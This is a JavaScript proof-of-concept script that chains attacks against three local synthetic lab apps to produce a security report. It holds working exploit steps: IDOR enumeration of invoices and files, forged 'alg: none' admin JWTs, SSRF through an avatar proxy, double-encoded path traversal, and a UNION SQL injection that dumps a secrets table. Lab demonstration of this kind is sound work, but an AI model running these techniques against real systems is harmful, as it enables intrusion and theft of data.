// threat_demo.mjs - controlled, local-only proof of the attack chain.
// Usage: node threat_demo.mjs <scan-id>
//
// This does NOT attack a customer. It runs one script against the three synthetic
// labs on 127.0.0.1:4101-4103 and records exact requests, responses, data exposed
// and flags. It writes attack-chain.json into the scan directory for the report.
import fs from "node:fs";
import path from "node:path";

const scanId = process.argv[2];
if (!scanId) { console.error("usage: node threat_demo.mjs <scan-id>"); process.exit(2); }

const HERE = import.meta.dirname;
const dir = path.join(HERE, "scans", scanId);
if (!fs.existsSync(dir)) { console.error(`unknown scan: ${scanId}`); process.exit(2); }

const NW = "http://127.0.0.1:4101";
const PD = "http://127.0.0.1:4102";
const OD = "http://127.0.0.1:4103";
for (const base of [NW, PD, OD]) {
  if (!/^http:\/\/127\.0\.0\.1:410[123]$/.test(base)) throw new Error("refusing non-lab target");
}

const t0 = Date.now();
const steps = [];
const flagSet = new Set();
const addFlags = (text) => {
  for (const match of String(text || "").matchAll(/HMW\{[^}]+\}/g)) flagSet.add(match[0]);
};
const snippet = (value, max = 1400) => {
  const s = String(value || "");
  return s.length > max ? `${s.slice(0, max)}\n... [${s.length - max} tekens ingekort]` : s;
};
const b64url = (value) => Buffer.from(JSON.stringify(value)).toString("base64url");
const asJson = (text) => { try { return JSON.parse(text); } catch { return null; } };

async function call(url, options = {}) {
  const started = Date.now();
  const response = await fetch(url, { redirect: "manual", ...options });
  const text = await response.text();
  addFlags(text);
  return {
    status: response.status,
    text,
    ms: Date.now() - started,
    headers: response.headers,
    json: asJson(text),
  };
}
function cookieOf(response) {
  const values = typeof response.headers.getSetCookie === "function"
    ? response.headers.getSetCookie()
    : [response.headers.get("set-cookie") || ""];
  return values.map((value) => value.split(";")[0]).filter(Boolean).join("; ");
}
function addStep(title, request, response, proof) {
  steps.push({
    n: steps.length + 1,
    atMs: Date.now() - t0,
    title,
    request,
    response: {
      status: response.status,
      ms: response.ms,
      body: snippet(response.text),
    },
    proof,
  });
}

// 1. Northwind: public demo login
const nwLogin = await call(`${NW}/api/login`, {
  method: "POST",
  headers: { "content-type": "application/json" },
  body: JSON.stringify({ email: "analyst@northwind.test", password: "analyst123" }),
});
if (!nwLogin.json?.token) throw new Error(`Northwind login failed: ${nwLogin.status} ${nwLogin.text.slice(0, 200)}`);
const nwToken = nwLogin.json.token;
const nwUser = nwLogin.json.user;
const nwHeaders = { authorization: `Bearer ${nwToken}` };
addStep(
  "Binnenkomen met het demo-account dat op de loginpagina staat",
  { method: "POST", url: `${NW}/api/login`, body: { email: "analyst@northwind.test", password: "analyst123" } },
  nwLogin,
  { role: nwUser.role, account: nwUser.email, tokenType: nwLogin.json.token_type },
);

// 2. IDOR: read other customers' invoices
const own = await call(`${NW}/api/invoices`, { headers: nwHeaders });
const invoices = [];
for (const id of [1005, 1006, 1007, 1008]) {
  const response = await call(`${NW}/api/invoices/${id}`, { headers: nwHeaders });
  if (response.status === 200 && response.json) invoices.push(response.json);
}
for (const invoice of invoices) addFlags(invoice.internal_note);
const invoiceStep = await call(`${NW}/api/invoices/1005`, { headers: nwHeaders });
addStep(
  "Facturen van andere klanten lezen via een voorspelbaar volgnummer",
  { method: "GET", url: `${NW}/api/invoices/1005`, headers: { authorization: "Bearer [ANALYST_JWT]" } },
  invoiceStep,
  {
    ownInvoices: Array.isArray(own.json) ? own.json.length : (own.json?.invoices?.length || 0),
    crossOwnerInvoices: invoices.map((i) => ({
      id: i.id, number: i.number, account: i.account, owner: i.owner,
      total: i.total, currency: i.currency, flag: (String(i.internal_note || "").match(/HMW\{[^}]+\}/) || [])[0] || "",
    })),
    uniqueCustomers: [...new Set(invoices.map((i) => i.account))].length,
  },
);

// 3. Forge an unsigned admin token
const now = Math.floor(Date.now() / 1000);
const forged = `${b64url({ alg: "none", typ: "JWT" })}.${b64url({
  sub: nwUser.id, email: nwUser.email, name: nwUser.name, role: "admin",
  team: nwUser.team, iss: "northwind-crm", iat: now, exp: now + 3600,
})}.`;
const nwAdmin = await call(`${NW}/api/admin/flag`, { headers: { authorization: `Bearer ${forged}` } });
addStep(
  "Zelf een admin-token maken zonder handtekening",
  { method: "GET", url: `${NW}/api/admin/flag`, headers: { authorization: "Bearer [FORGED_ALG_NONE_JWT]" } },
  nwAdmin,
  { flag: nwAdmin.json?.flag || "", scope: nwAdmin.json?.scope || "" },
);

// 4. SSRF and cross-app pivot
const internal = await call(`${NW}/api/avatar?url=${encodeURIComponent(`${NW}/internal/flag`)}`, { headers: nwHeaders });
addStep(
  "De interne service lezen via de avatar-proxy",
  { method: "GET", url: `${NW}/api/avatar?url=${encodeURIComponent(`${NW}/internal/flag`)}`, headers: { authorization: "Bearer [ANALYST_JWT]" } },
  internal,
  { flag: (internal.text.match(/HMW\{[^}]+\}/) || [])[0] || "" },
);

const pixelTarget = `${PD}/download?file=..%252F..%252Fsecret%252Fflag.txt`;
const pivot = await call(`${NW}/api/avatar?url=${encodeURIComponent(pixelTarget)}`, { headers: nwHeaders });
addStep(
  "Van de eerste app doorstoten naar de tweede app en een geheim bestand lezen",
  { method: "GET", url: `${NW}/api/avatar?url=${encodeURIComponent(pixelTarget)}`, headers: { authorization: "Bearer [ANALYST_JWT]" } },
  pivot,
  { flag: (pivot.text.match(/HMW\{[^}]+\}/) || [])[0] || "", pivot: "PixelDrop 4102" },
);

// 5. PixelDrop: private files and traversal
const pdLogin = await call(`${PD}/login`, {
  method: "POST",
  headers: { "content-type": "application/x-www-form-urlencoded" },
  body: new URLSearchParams({ email: "demo@pixeldrop.test", password: "demo1234" }),
});
const pdCookie = cookieOf(pdLogin);
addStep(
  "Inloggen op de tweede app met de demo-gegevens",
  { method: "POST", url: `${PD}/login`, body: { email: "demo@pixeldrop.test", password: "demo1234" } },
  pdLogin,
  { cookieIssued: !!pdCookie, status: pdLogin.status },
);

const privateFiles = [];
for (const id of [1001, 1002, 1003]) {
  const response = await call(`${PD}/api/files/${id}`, { headers: { cookie: pdCookie } });
  if (response.status === 200 && response.json) privateFiles.push(response.json);
}
const privateStep = await call(`${PD}/api/files/1001`, { headers: { cookie: pdCookie } });
addStep(
  "Privébestanden van andere gebruikers openen",
  { method: "GET", url: `${PD}/api/files/1001`, headers: { cookie: "[DEMO_SESSION]" } },
  privateStep,
  {
    privateFilesRead: privateFiles.map((f) => ({
      id: f.id, owner: f.owner, name: f.name,
      flag: (String(JSON.stringify(f)).match(/HMW\{[^}]+\}/) || [])[0] || "",
    })),
  },
);

const traversal = await call(`${PD}/download?file=..%252F..%252Fsecret%252Fflag.txt`);
addStep(
  "Een geheim bestand buiten de uploadmap lezen met dubbele path-encoding",
  { method: "GET", url: `${PD}/download?file=..%252F..%252Fsecret%252Fflag.txt` },
  traversal,
  { flag: (traversal.text.match(/HMW\{[^}]+\}/) || [])[0] || "" },
);

// 6. OrbitDesk: SQL injection, secrets, admin bypass
const odLogin = await call(`${OD}/login`, {
  method: "POST",
  headers: { "content-type": "application/x-www-form-urlencoded" },
  body: new URLSearchParams({ email: "agent@orbitdesk.test", password: "orbit123", next: "/tickets" }),
});
const odCookie = cookieOf(odLogin);
addStep(
  "Inloggen op de derde app met de demo-gegevens",
  { method: "POST", url: `${OD}/login`, body: { email: "agent@orbitdesk.test", password: "orbit123" } },
  odLogin,
  { cookieIssued: !!odCookie, status: odLogin.status },
);

const sqli = await call(`${OD}/search?q=${encodeURIComponent("zzz' UNION SELECT id,name,value,scope,'leaked',created_at FROM secrets-- -")}`, {
  headers: { cookie: odCookie },
});
const secretNames = [...sqli.text.matchAll(/(SUPPORT_API_TOKEN|SEARCH_FLAG|LEGACY_SMTP_PASSWORD|SESSION_SIGNING_KEY|BILLING_WEBHOOK_SECRET|ADMIN_BREAKGLASS_TOKEN)/g)].map((m) => m[1]);
const secretCount = new Set(secretNames).size;
addStep(
  "De zoekfunctie injecteren en de gehele secrets-tabel uitlezen",
  { method: "GET", url: `${OD}/search?q=zzz' UNION SELECT ... FROM secrets-- -`, headers: { cookie: "[DEMO_SESSION]" } },
  sqli,
  {
    flag: (sqli.text.match(/HMW\{[^}]+\}/) || [])[0] || "",
    secretNames: [...new Set(secretNames)],
    secretCount,
    containsPlaintextPasswords: /password/i.test(sqli.text),
  },
);

const odForged = `${b64url({ alg: "none", typ: "JWT" })}.${b64url({
  sub: "agent@orbitdesk.test", name: "Alex Fielding", role: "admin", iat: now, iss: "orbitdesk",
})}.`;
const odAdmin = await call(`${OD}/admin/flag`, { headers: { cookie: `orbit_session=${odForged}` } });
addStep(
  "De helpdesk-admin worden met een zelfgemaakt token",
  { method: "GET", url: `${OD}/admin/flag`, headers: { cookie: "orbit_session=[FORGED_ALG_NONE_JWT]" } },
  odAdmin,
  { flag: (odAdmin.text.match(/HMW\{[^}]+\}/) || [])[0] || "" },
);

// 7. Impact
const flags = [...flagSet].sort();
const impact = {
  durationMs: Date.now() - t0,
  invoicesRead: invoices.length,
  customersExposed: new Set(invoices.map((i) => i.account)).size,
  privateFilesRead: privateFiles.length,
  secretsExposed: secretCount,
  adminApps: 2,
  appsCompromised: 3,
  pivotedApps: 2,
  flags: flags.length,
  attackerAccounts: 3,
};
const chain = {
  scanId,
  generatedAt: new Date().toISOString(),
  targetScope: {
    northwind: NW,
    pixeldrop: PD,
    orbitdesk: OD,
    note: "Local synthetic labs only. No external target was contacted.",
  },
  title: "Van een publiek demo-account naar admin op drie apps",
  actor: "Eén aanvaller met de publieke demo-accounts die op de loginpagina's staan",
  impact,
  steps,
  data: {
    invoices: invoices.map((i) => ({
      id: i.id, number: i.number, account: i.account, owner: i.owner, total: i.total, currency: i.currency,
    })),
    privateFiles: privateFiles.map((f) => ({ id: f.id, owner: f.owner, name: f.name })),
    secretNames: [...new Set(secretNames)],
  },
  flags,
  conclusion: "De keten is met één script uitgevoerd. Dezelfde stappen werken opnieuw zolang de demo-logins en de kwetsbare routes open staan.",
};
fs.writeFileSync(path.join(dir, "attack-chain.json"), JSON.stringify(chain, null, 2));
console.log(JSON.stringify({ out: path.join(dir, "attack-chain.json"), impact, flags }, null, 2));
